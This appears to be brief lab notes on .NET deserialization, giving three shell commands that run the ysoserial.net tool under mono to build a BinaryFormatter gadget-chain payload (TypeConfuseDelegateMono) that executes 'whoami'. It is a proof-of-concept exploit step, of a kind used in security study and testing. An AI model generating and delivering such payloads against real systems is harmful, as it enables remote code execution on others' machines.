# Serialized 


```bash
cd /root/ysoserials/dotnet/Release
```

```bash
unset TERM
```



```bash
TERM=dumb mono ysoserial.exe -g TypeConfuseDelegateMono -f BinaryFormatter -c "whoami"
```